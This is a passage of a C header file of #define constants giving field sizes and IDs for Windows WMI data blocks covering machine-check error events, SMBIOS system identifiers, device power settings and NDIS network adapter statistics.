#define MSMCAEvent_PCIBusError_PCI_BUS_ID_BusNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIBusError_PCI_BUS_ID_BusNumber_ID 16
#define MSMCAEvent_PCIBusError_PCI_BUS_ID_SegmentNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIBusError_PCI_BUS_ID_SegmentNumber_ID 17
#define MSMCAEvent_PCIBusError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIBusError_Size_ID 18
#define MSMCAEvent_PCIBusError_RawRecord_ID 19

#define SYSID_UUID_Uuid_SIZE sizeof(UCHAR[16])
#define SYSID_UUID_Uuid_ID 1

#define SYSID_UUID_SIZE (FIELD_OFFSET(SYSID_UUID, Uuid) + SYSID_UUID_Uuid_SIZE)

#define MSSmBios_SysidUUIDList_Count_SIZE sizeof(ULONG)
#define MSSmBios_SysidUUIDList_Count_ID 1
#define MSSmBios_SysidUUIDList_List_ID 2

#define SYSID_1394_x1394_SIZE sizeof(UCHAR[8])
#define SYSID_1394_x1394_ID 1

#define SYSID_1394_SIZE (FIELD_OFFSET(SYSID_1394, x1394) + SYSID_1394_x1394_SIZE)

#define MSSmBios_Sysid1394List_Count_SIZE sizeof(ULONG)
#define MSSmBios_Sysid1394List_Count_ID 1
#define MSSmBios_Sysid1394List_List_ID 2

#define MSMCAEvent_PCIComponentError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIComponentError_RecordId_ID 1
#define MSMCAEvent_PCIComponentError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_ErrorSeverity_ID 2
#define MSMCAEvent_PCIComponentError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIComponentError_Type_ID 3
#define MSMCAEvent_PCIComponentError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIComponentError_Cpu_ID 4
#define MSMCAEvent_PCIComponentError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIComponentError_AdditionalErrors_ID 5
#define MSMCAEvent_PCIComponentError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIComponentError_LogToEventlog_ID 6
#define MSMCAEvent_PCIComponentError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIComponentError_VALIDATION_BITS_ID 7
#define MSMCAEvent_PCIComponentError_PCI_COMP_ERROR_STATUS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PCIComponentError_PCI_COMP_ERROR_STATUS_ID 8
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_VendorId_SIZE sizeof(USHORT)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_VendorId_ID 9
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_DeviceId_SIZE sizeof(USHORT)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_DeviceId_ID 10
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeInterface_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeInterface_ID 11
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeSubClass_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeSubClass_ID 12
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeBaseClass_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_ClassCodeBaseClass_ID 13
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_FunctionNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_FunctionNumber_ID 14
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_DeviceNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_DeviceNumber_ID 15
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_BusNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_BusNumber_ID 16
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_SegmentNumber_SIZE sizeof(UCHAR)
#define MSMCAEvent_PCIComponentError_PCI_COMP_INFO_SegmentNumber_ID 17
#define MSMCAEvent_PCIComponentError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_PCIComponentError_Size_ID 18
#define MSMCAEvent_PCIComponentError_RawRecord_ID 19

#define MSMCAEvent_SystemEventError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_SystemEventError_RecordId_ID 1
#define MSMCAEvent_SystemEventError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_ErrorSeverity_ID 2
#define MSMCAEvent_SystemEventError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_SystemEventError_Type_ID 3
#define MSMCAEvent_SystemEventError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_SystemEventError_Cpu_ID 4
#define MSMCAEvent_SystemEventError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_SystemEventError_AdditionalErrors_ID 5
#define MSMCAEvent_SystemEventError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_SystemEventError_LogToEventlog_ID 6
#define MSMCAEvent_SystemEventError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_SystemEventError_VALIDATION_BITS_ID 7
#define MSMCAEvent_SystemEventError_SEL_TIME_STAMP_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_SystemEventError_SEL_TIME_STAMP_ID 8
#define MSMCAEvent_SystemEventError_SEL_RECORD_ID_SIZE sizeof(USHORT)
#define MSMCAEvent_SystemEventError_SEL_RECORD_ID_ID 9
#define MSMCAEvent_SystemEventError_SEL_GENERATOR_ID_SIZE sizeof(USHORT)
#define MSMCAEvent_SystemEventError_SEL_GENERATOR_ID_ID 10
#define MSMCAEvent_SystemEventError_SEL_RECORD_TYPE_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_RECORD_TYPE_ID 11
#define MSMCAEvent_SystemEventError_SEL_EVM_REV_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_EVM_REV_ID 12
#define MSMCAEvent_SystemEventError_SEL_SENSOR_TYPE_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_SENSOR_TYPE_ID 13
#define MSMCAEvent_SystemEventError_SEL_SENSOR_NUM_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_SENSOR_NUM_ID 14
#define MSMCAEvent_SystemEventError_SEL_EVENT_DIR_TYPE_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_EVENT_DIR_TYPE_ID 15
#define MSMCAEvent_SystemEventError_SEL_DATA1_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_DATA1_ID 16
#define MSMCAEvent_SystemEventError_SEL_DATA2_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_DATA2_ID 17
#define MSMCAEvent_SystemEventError_SEL_DATA3_SIZE sizeof(UCHAR)
#define MSMCAEvent_SystemEventError_SEL_DATA3_ID 18
#define MSMCAEvent_SystemEventError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_SystemEventError_Size_ID 19
#define MSMCAEvent_SystemEventError_RawRecord_ID 20

#define MSMCAEvent_SMBIOSError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_SMBIOSError_RecordId_ID 1
#define MSMCAEvent_SMBIOSError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_SMBIOSError_ErrorSeverity_ID 2
#define MSMCAEvent_SMBIOSError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_SMBIOSError_Type_ID 3
#define MSMCAEvent_SMBIOSError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_SMBIOSError_Cpu_ID 4
#define MSMCAEvent_SMBIOSError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_SMBIOSError_AdditionalErrors_ID 5
#define MSMCAEvent_SMBIOSError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_SMBIOSError_LogToEventlog_ID 6
#define MSMCAEvent_SMBIOSError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_SMBIOSError_VALIDATION_BITS_ID 7
#define MSMCAEvent_SMBIOSError_SMBIOS_EVENT_TYPE_SIZE sizeof(UCHAR)
#define MSMCAEvent_SMBIOSError_SMBIOS_EVENT_TYPE_ID 8
#define MSMCAEvent_SMBIOSError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_SMBIOSError_Size_ID 9
#define MSMCAEvent_SMBIOSError_RawRecord_ID 10

#define MSMCAEvent_PlatformSpecificError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_RecordId_ID 1
#define MSMCAEvent_PlatformSpecificError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_PlatformSpecificError_ErrorSeverity_ID 2
#define MSMCAEvent_PlatformSpecificError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_PlatformSpecificError_Type_ID 3
#define MSMCAEvent_PlatformSpecificError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_PlatformSpecificError_Cpu_ID 4
#define MSMCAEvent_PlatformSpecificError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_PlatformSpecificError_AdditionalErrors_ID 5
#define MSMCAEvent_PlatformSpecificError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_PlatformSpecificError_LogToEventlog_ID 6
#define MSMCAEvent_PlatformSpecificError_VALIDATION_BITS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_VALIDATION_BITS_ID 7
#define MSMCAEvent_PlatformSpecificError_PLATFORM_ERROR_STATUS_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_PLATFORM_ERROR_STATUS_ID 8
#define MSMCAEvent_PlatformSpecificError_PLATFORM_REQUESTOR_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_PLATFORM_REQUESTOR_ID_ID 9
#define MSMCAEvent_PlatformSpecificError_PLATFORM_RESPONDER_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_PLATFORM_RESPONDER_ID_ID 10
#define MSMCAEvent_PlatformSpecificError_PLATFORM_TARGET_ID_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_PLATFORM_TARGET_ID_ID 11
#define MSMCAEvent_PlatformSpecificError_PLATFORM_BUS_SPECIFIC_DATA_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_PlatformSpecificError_PLATFORM_BUS_SPECIFIC_DATA_ID 12
#define MSMCAEvent_PlatformSpecificError_OEM_COMPONENT_ID_SIZE sizeof(UCHAR[16])
#define MSMCAEvent_PlatformSpecificError_OEM_COMPONENT_ID_ID 13
#define MSMCAEvent_PlatformSpecificError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_PlatformSpecificError_Size_ID 14
#define MSMCAEvent_PlatformSpecificError_RawRecord_ID 15

#define MSMCAEvent_InvalidError_RecordId_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_InvalidError_RecordId_ID 1
#define MSMCAEvent_InvalidError_ErrorSeverity_SIZE sizeof(UCHAR)
#define MSMCAEvent_InvalidError_ErrorSeverity_ID 2
#define MSMCAEvent_InvalidError_Type_SIZE sizeof(ULONG)
#define MSMCAEvent_InvalidError_Type_ID 3
#define MSMCAEvent_InvalidError_Cpu_SIZE sizeof(ULONG)
#define MSMCAEvent_InvalidError_Cpu_ID 4
#define MSMCAEvent_InvalidError_AdditionalErrors_SIZE sizeof(ULONG)
#define MSMCAEvent_InvalidError_AdditionalErrors_ID 5
#define MSMCAEvent_InvalidError_LogToEventlog_SIZE sizeof(ULONG)
#define MSMCAEvent_InvalidError_LogToEventlog_ID 6
#define MSMCAEvent_InvalidError_Size_SIZE sizeof(ULONG)
#define MSMCAEvent_InvalidError_Size_ID 7
#define MSMCAEvent_InvalidError_RawRecord_ID 8

#define MSMCAEvent_MemoryPageRemoved_PhysicalAddress_SIZE sizeof(ULONGLONG)
#define MSMCAEvent_MemoryPageRemoved_PhysicalAddress_ID 1

#define MSMCAEvent_MemoryPageRemoved_SIZE (FIELD_OFFSET(MSMCAEvent_MemoryPageRemoved, PhysicalAddress) + MSMCAEvent_MemoryPageRemoved_PhysicalAddress_SIZE)

#define MSMCAInfo_Entry_Length_SIZE sizeof(ULONG)
#define MSMCAInfo_Entry_Length_ID 1
#define MSMCAInfo_Entry_Data_ID 2

#define MSMCAInfo_RawMCAData_Count_SIZE sizeof(ULONG)
#define MSMCAInfo_RawMCAData_Count_ID 1
#define MSMCAInfo_RawMCAData_Records_ID 2

#define MSMCAInfo_RawCMCEvent_Count_SIZE sizeof(ULONG)
#define MSMCAInfo_RawCMCEvent_Count_ID 1
#define MSMCAInfo_RawCMCEvent_Records_ID 2

#define MSMCAInfo_RawMCAEvent_Count_SIZE sizeof(ULONG)
#define MSMCAInfo_RawMCAEvent_Count_ID 1
#define MSMCAInfo_RawMCAEvent_Records_ID 2

#define MSMCAInfo_RawCorrectedPlatformEvent_Count_SIZE sizeof(ULONG)
#define MSMCAInfo_RawCorrectedPlatformEvent_Count_ID 1
#define MSMCAInfo_RawCorrectedPlatformEvent_Records_ID 2

#define MSPower_DeviceEnable_Enable_SIZE sizeof(BOOLEAN)
#define MSPower_DeviceEnable_Enable_ID 1

#define MSPower_DeviceEnable_SIZE (FIELD_OFFSET(MSPower_DeviceEnable, Enable) + MSPower_DeviceEnable_Enable_SIZE)

#define MSPower_DeviceWakeEnable_Enable_SIZE sizeof(BOOLEAN)
#define MSPower_DeviceWakeEnable_Enable_ID 1

#define MSPower_DeviceWakeEnable_SIZE (FIELD_OFFSET(MSPower_DeviceWakeEnable, Enable) + MSPower_DeviceWakeEnable_Enable_SIZE)

#define MSNdis_NetworkAddress_Address_SIZE sizeof(UCHAR[6])
#define MSNdis_NetworkAddress_Address_ID 1

#define MSNdis_NetworkAddress_SIZE (FIELD_OFFSET(MSNdis_NetworkAddress, Address) + MSNdis_NetworkAddress_Address_SIZE)

#define MSNdis_NetworkShortAddress_Address_SIZE sizeof(UCHAR[2])
#define MSNdis_NetworkShortAddress_Address_ID 1

#define MSNdis_NetworkShortAddress_SIZE (FIELD_OFFSET(MSNdis_NetworkShortAddress, Address) + MSNdis_NetworkShortAddress_Address_SIZE)

#define MSNdis_NetworkLinkSpeed_Outbound_SIZE sizeof(ULONG)
#define MSNdis_NetworkLinkSpeed_Outbound_ID 1
#define MSNdis_NetworkLinkSpeed_Inbound_SIZE sizeof(ULONG)
#define MSNdis_NetworkLinkSpeed_Inbound_ID 2

#define MSNdis_NetworkLinkSpeed_SIZE (FIELD_OFFSET(MSNdis_NetworkLinkSpeed, Inbound) + MSNdis_NetworkLinkSpeed_Inbound_SIZE)

#define MSNdis_EnumerateAdapter_DeviceName_ID 1
#define MSNdis_NotifyAdapterRemoval_DeviceName_ID 1
#define MSNdis_NotifyAdapterArrival_DeviceName_ID 1

#define MSNdis_DeviceWakeOnMagicPacketOnly_EnableWakeOnMagicPacketOnly_SIZE sizeof(BOOLEAN)
#define MSNdis_DeviceWakeOnMagicPacketOnly_EnableWakeOnMagicPacketOnly_ID 1

#define MSNdis_DeviceWakeOnMagicPacketOnly_SIZE (FIELD_OFFSET(MSNdis_DeviceWakeOnMagicPacketOnly, EnableWakeOnMagicPacketOnly) + MSNdis_DeviceWakeOnMagicPacketOnly_EnableWakeOnMagicPacketOnly_SIZE)

#define MSNdis_RSSEnabled_RSSEnabled_SIZE sizeof(BOOLEAN)
#define MSNdis_RSSEnabled_RSSEnabled_ID 1

#define MSNdis_RSSEnabled_SIZE (FIELD_OFFSET(MSNdis_RSSEnabled, RSSEnabled) + MSNdis_RSSEnabled_RSSEnabled_SIZE)

#define MSNdis_HardwareStatus_NdisHardwareStatus_SIZE sizeof(ULONG)
#define MSNdis_HardwareStatus_NdisHardwareStatus_ID 1

#define MSNdis_HardwareStatus_SIZE (FIELD_OFFSET(MSNdis_HardwareStatus, NdisHardwareStatus) + MSNdis_HardwareStatus_NdisHardwareStatus_SIZE)

#define MSNdis_MediaSupported_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_MediaSupported_NumberElements_ID 1
#define MSNdis_MediaSupported_NdisMediaSupported_ID 2

#define MSNdis_MediaInUse_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_MediaInUse_NumberElements_ID 1
#define MSNdis_MediaInUse_NdisMediaInUse_ID 2

#define MSNdis_MaximumLookahead_NdisMaximumLookahead_SIZE sizeof(ULONG)
#define MSNdis_MaximumLookahead_NdisMaximumLookahead_ID 1

#define MSNdis_MaximumLookahead_SIZE (FIELD_OFFSET(MSNdis_MaximumLookahead, NdisMaximumLookahead) + MSNdis_MaximumLookahead_NdisMaximumLookahead_SIZE)

#define MSNdis_MaximumFrameSize_NdisMaximumFrameSize_SIZE sizeof(ULONG)
#define MSNdis_MaximumFrameSize_NdisMaximumFrameSize_ID 1

#define MSNdis_MaximumFrameSize_SIZE (FIELD_OFFSET(MSNdis_MaximumFrameSize, NdisMaximumFrameSize) + MSNdis_MaximumFrameSize_NdisMaximumFrameSize_SIZE)

#define MSNdis_LinkSpeed_NdisLinkSpeed_SIZE sizeof(ULONG)
#define MSNdis_LinkSpeed_NdisLinkSpeed_ID 1

#define MSNdis_LinkSpeed_SIZE (FIELD_OFFSET(MSNdis_LinkSpeed, NdisLinkSpeed) + MSNdis_LinkSpeed_NdisLinkSpeed_SIZE)

#define MSNdis_TransmitBufferSpace_NdisTransmitBufferSpace_SIZE sizeof(ULONG)
#define MSNdis_TransmitBufferSpace_NdisTransmitBufferSpace_ID 1

#define MSNdis_TransmitBufferSpace_SIZE (FIELD_OFFSET(MSNdis_TransmitBufferSpace, NdisTransmitBufferSpace) + MSNdis_TransmitBufferSpace_NdisTransmitBufferSpace_SIZE)

#define MSNdis_ReceiveBufferSpace_NdisReceiveBufferSpace_SIZE sizeof(ULONG)
#define MSNdis_ReceiveBufferSpace_NdisReceiveBufferSpace_ID 1

#define MSNdis_ReceiveBufferSpace_SIZE (FIELD_OFFSET(MSNdis_ReceiveBufferSpace, NdisReceiveBufferSpace) + MSNdis_ReceiveBufferSpace_NdisReceiveBufferSpace_SIZE)

#define MSNdis_TransmitBlockSize_NdisTransmitBlockSize_SIZE sizeof(ULONG)
#define MSNdis_TransmitBlockSize_NdisTransmitBlockSize_ID 1

#define MSNdis_TransmitBlockSize_SIZE (FIELD_OFFSET(MSNdis_TransmitBlockSize, NdisTransmitBlockSize) + MSNdis_TransmitBlockSize_NdisTransmitBlockSize_SIZE)

#define MSNdis_ReceiveBlockSize_NdisReceiveBlockSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveBlockSize_NdisReceiveBlockSize_ID 1

#define MSNdis_ReceiveBlockSize_SIZE (FIELD_OFFSET(MSNdis_ReceiveBlockSize, NdisReceiveBlockSize) + MSNdis_ReceiveBlockSize_NdisReceiveBlockSize_SIZE)

#define MSNdis_VendorID_NdisVendorID_SIZE sizeof(ULONG)
#define MSNdis_VendorID_NdisVendorID_ID 1

#define MSNdis_VendorID_SIZE (FIELD_OFFSET(MSNdis_VendorID, NdisVendorID) + MSNdis_VendorID_NdisVendorID_SIZE)

#define MSNdis_VendorDescription_NdisVendorDescription_ID 1

#define MSNdis_CurrentPacketFilter_NdisCurrentPacketFilter_SIZE sizeof(ULONG)
#define MSNdis_CurrentPacketFilter_NdisCurrentPacketFilter_ID 1

#define MSNdis_CurrentPacketFilter_SIZE (FIELD_OFFSET(MSNdis_CurrentPacketFilter, NdisCurrentPacketFilter) + MSNdis_CurrentPacketFilter_NdisCurrentPacketFilter_SIZE)

#define MSNdis_CurrentLookahead_NdisCurrentLookahead_SIZE sizeof(ULONG)
#define MSNdis_CurrentLookahead_NdisCurrentLookahead_ID 1

#define MSNdis_CurrentLookahead_SIZE (FIELD_OFFSET(MSNdis_CurrentLookahead, NdisCurrentLookahead) + MSNdis_CurrentLookahead_NdisCurrentLookahead_SIZE)

#define MSNdis_DriverVersion_NdisDriverVersion_SIZE sizeof(USHORT)
#define MSNdis_DriverVersion_NdisDriverVersion_ID 1

#define MSNdis_DriverVersion_SIZE (FIELD_OFFSET(MSNdis_DriverVersion, NdisDriverVersion) + MSNdis_DriverVersion_NdisDriverVersion_SIZE)

#define MSNdis_MaximumTotalSize_NdisMaximumTotalSize_SIZE sizeof(ULONG)
#define MSNdis_MaximumTotalSize_NdisMaximumTotalSize_ID 1

#define MSNdis_MaximumTotalSize_SIZE (FIELD_OFFSET(MSNdis_MaximumTotalSize, NdisMaximumTotalSize) + MSNdis_MaximumTotalSize_NdisMaximumTotalSize_SIZE)

#define MSNdis_MacOptions_NdisMacOptions_SIZE sizeof(ULONG)
#define MSNdis_MacOptions_NdisMacOptions_ID 1

#define MSNdis_MacOptions_SIZE (FIELD_OFFSET(MSNdis_MacOptions, NdisMacOptions) + MSNdis_MacOptions_NdisMacOptions_SIZE)

#define MSNdis_MediaConnectStatus_NdisMediaConnectStatus_SIZE sizeof(ULONG)
#define MSNdis_MediaConnectStatus_NdisMediaConnectStatus_ID 1

#define MSNdis_MediaConnectStatus_SIZE (FIELD_OFFSET(MSNdis_MediaConnectStatus, NdisMediaConnectStatus) + MSNdis_MediaConnectStatus_NdisMediaConnectStatus_SIZE)

#define MSNdis_MaximumSendPackets_NdisMaximumSendPackets_SIZE sizeof(ULONG)
#define MSNdis_MaximumSendPackets_NdisMaximumSendPackets_ID 1

#define MSNdis_MaximumSendPackets_SIZE (FIELD_OFFSET(MSNdis_MaximumSendPackets, NdisMaximumSendPackets) + MSNdis_MaximumSendPackets_NdisMaximumSendPackets_SIZE)

#define MSNdis_VendorDriverVersion_NdisVendorDriverVersion_SIZE sizeof(ULONG)
#define MSNdis_VendorDriverVersion_NdisVendorDriverVersion_ID 1

#define MSNdis_VendorDriverVersion_SIZE (FIELD_OFFSET(MSNdis_VendorDriverVersion, NdisVendorDriverVersion) + MSNdis_VendorDriverVersion_NdisVendorDriverVersion_SIZE)

#define MSNdis_VlanIdentifier_NdisVlanId_SIZE sizeof(ULONG)
#define MSNdis_VlanIdentifier_NdisVlanId_ID 1

#define MSNdis_VlanIdentifier_SIZE (FIELD_OFFSET(MSNdis_VlanIdentifier, NdisVlanId) + MSNdis_VlanIdentifier_NdisVlanId_SIZE)

#define MSNdis_PhysicalMediumType_NdisPhysicalMediumType_SIZE sizeof(ULONG)
#define MSNdis_PhysicalMediumType_NdisPhysicalMediumType_ID 1

#define MSNdis_PhysicalMediumType_SIZE (FIELD_OFFSET(MSNdis_PhysicalMediumType, NdisPhysicalMediumType) + MSNdis_PhysicalMediumType_NdisPhysicalMediumType_SIZE)

#define MSNdis_TransmitsOk_NdisTransmitsOk_SIZE sizeof(ULONGLONG)
#define MSNdis_TransmitsOk_NdisTransmitsOk_ID 1

#define MSNdis_TransmitsOk_SIZE (FIELD_OFFSET(MSNdis_TransmitsOk, NdisTransmitsOk) + MSNdis_TransmitsOk_NdisTransmitsOk_SIZE)

#define MSNdis_ReceivesOk_NdisReceivesOk_SIZE sizeof(ULONGLONG)
#define MSNdis_ReceivesOk_NdisReceivesOk_ID 1

#define MSNdis_ReceivesOk_SIZE (FIELD_OFFSET(MSNdis_ReceivesOk, NdisReceivesOk) + MSNdis_ReceivesOk_NdisReceivesOk_SIZE)

#define MSNdis_TransmitsError_NdisTransmitsError_SIZE sizeof(ULONG)
#define MSNdis_TransmitsError_NdisTransmitsError_ID 1

#define MSNdis_TransmitsError_SIZE (FIELD_OFFSET(MSNdis_TransmitsError, NdisTransmitsError) + MSNdis_TransmitsError_NdisTransmitsError_SIZE)

#define MSNdis_ReceiveError_NdisReceiveError_SIZE sizeof(ULONG)
#define MSNdis_ReceiveError_NdisReceiveError_ID 1

#define MSNdis_ReceiveError_SIZE (FIELD_OFFSET(MSNdis_ReceiveError, NdisReceiveError) + MSNdis_ReceiveError_NdisReceiveError_SIZE)

#define MSNdis_ReceiveNoBuffer_NdisReceiveNoBuffer_SIZE sizeof(ULONG)
#define MSNdis_ReceiveNoBuffer_NdisReceiveNoBuffer_ID 1

#define MSNdis_ReceiveNoBuffer_SIZE (FIELD_OFFSET(MSNdis_ReceiveNoBuffer, NdisReceiveNoBuffer) + MSNdis_ReceiveNoBuffer_NdisReceiveNoBuffer_SIZE)

#define MSNdis_CoHardwareStatus_NdisCoHardwareStatus_SIZE sizeof(ULONG)
#define MSNdis_CoHardwareStatus_NdisCoHardwareStatus_ID 1

#define MSNdis_CoHardwareStatus_SIZE (FIELD_OFFSET(MSNdis_CoHardwareStatus, NdisCoHardwareStatus) + MSNdis_CoHardwareStatus_NdisCoHardwareStatus_SIZE)

#define MSNdis_CoMediaSupported_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_CoMediaSupported_NumberElements_ID 1
#define MSNdis_CoMediaSupported_NdisCoMediaSupported_ID 2

#define MSNdis_CoMediaInUse_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_CoMediaInUse_NumberElements_ID 1
#define MSNdis_CoMediaInUse_NdisCoMediaInUse_ID 2

#define MSNdis_CoLinkSpeed_NdisCoLinkSpeed_SIZE sizeof(MSNdis_NetworkLinkSpeed)
#define MSNdis_CoLinkSpeed_NdisCoLinkSpeed_ID 1

#define MSNdis_CoLinkSpeed_SIZE (FIELD_OFFSET(MSNdis_CoLinkSpeed, NdisCoLinkSpeed) + MSNdis_CoLinkSpeed_NdisCoLinkSpeed_SIZE)

#define MSNdis_CoVendorId_NdisCoVendorID_SIZE sizeof(ULONG)
#define MSNdis_CoVendorId_NdisCoVendorID_ID 1

#define MSNdis_CoVendorId_SIZE (FIELD_OFFSET(MSNdis_CoVendorId, NdisCoVendorID) + MSNdis_CoVendorId_NdisCoVendorID_SIZE)

#define MSNdis_CoVendorDescription_NdisCoVendorDescription_ID 1

#define MSNdis_CoDriverVersion_NdisCoDriverVersion_SIZE sizeof(USHORT)
#define MSNdis_CoDriverVersion_NdisCoDriverVersion_ID 1

#define MSNdis_CoDriverVersion_SIZE (FIELD_OFFSET(MSNdis_CoDriverVersion, NdisCoDriverVersion) + MSNdis_CoDriverVersion_NdisCoDriverVersion_SIZE)

#define MSNdis_CoMacOptions_NdisCoMacOptions_SIZE sizeof(ULONG)
#define MSNdis_CoMacOptions_NdisCoMacOptions_ID 1

#define MSNdis_CoMacOptions_SIZE (FIELD_OFFSET(MSNdis_CoMacOptions, NdisCoMacOptions) + MSNdis_CoMacOptions_NdisCoMacOptions_SIZE)

#define MSNdis_CoMediaConnectStatus_NdisCoMediaConnectStatus_SIZE sizeof(ULONG)
#define MSNdis_CoMediaConnectStatus_NdisCoMediaConnectStatus_ID 1

#define MSNdis_CoMediaConnectStatus_SIZE (FIELD_OFFSET(MSNdis_CoMediaConnectStatus, NdisCoMediaConnectStatus) + MSNdis_CoMediaConnectStatus_NdisCoMediaConnectStatus_SIZE)

#define MSNdis_CoVendorDriverVersion_NdisCoVendorDriverVersion_SIZE sizeof(ULONG)
#define MSNdis_CoVendorDriverVersion_NdisCoVendorDriverVersion_ID 1

#define MSNdis_CoVendorDriverVersion_SIZE (FIELD_OFFSET(MSNdis_CoVendorDriverVersion, NdisCoVendorDriverVersion) + MSNdis_CoVendorDriverVersion_NdisCoVendorDriverVersion_SIZE)

#define MSNdis_CoMinimumLinkSpeed_NdisCoMinimumLinkSpeed_SIZE sizeof(MSNdis_NetworkLinkSpeed)
#define MSNdis_CoMinimumLinkSpeed_NdisCoMinimumLinkSpeed_ID 1

#define MSNdis_CoMinimumLinkSpeed_SIZE (FIELD_OFFSET(MSNdis_CoMinimumLinkSpeed, NdisCoMinimumLinkSpeed) + MSNdis_CoMinimumLinkSpeed_NdisCoMinimumLinkSpeed_SIZE)

#define MSNdis_CoTransmitPdusOk_NdisCoTransmitPdusOk_SIZE sizeof(ULONGLONG)
#define MSNdis_CoTransmitPdusOk_NdisCoTransmitPdusOk_ID 1

#define MSNdis_CoTransmitPdusOk_SIZE (FIELD_OFFSET(MSNdis_CoTransmitPdusOk, NdisCoTransmitPdusOk) + MSNdis_CoTransmitPdusOk_NdisCoTransmitPdusOk_SIZE)

#define MSNdis_CoReceivePdusOk_NdisCoReceivePdusOk_SIZE sizeof(ULONGLONG)
#define MSNdis_CoReceivePdusOk_NdisCoReceivePdusOk_ID 1

#define MSNdis_CoReceivePdusOk_SIZE (FIELD_OFFSET(MSNdis_CoReceivePdusOk, NdisCoReceivePdusOk) + MSNdis_CoReceivePdusOk_NdisCoReceivePdusOk_SIZE)

#define MSNdis_CoTransmitPduErrors_NdisCoTransmitPduErrors_SIZE sizeof(ULONG)
#define MSNdis_CoTransmitPduErrors_NdisCoTransmitPduErrors_ID 1

#define MSNdis_CoTransmitPduErrors_SIZE (FIELD_OFFSET(MSNdis_CoTransmitPduErrors, NdisCoTransmitPduErrors) + MSNdis_CoTransmitPduErrors_NdisCoTransmitPduErrors_SIZE)

#define MSNdis_CoReceivePduErrors_NdisCoReceivePduErrors_SIZE sizeof(ULONG)
#define MSNdis_CoReceivePduErrors_NdisCoReceivePduErrors_ID 1

#define MSNdis_CoReceivePduErrors_SIZE (FIELD_OFFSET(MSNdis_CoReceivePduErrors, NdisCoReceivePduErrors) + MSNdis_CoReceivePduErrors_NdisCoReceivePduErrors_SIZE)

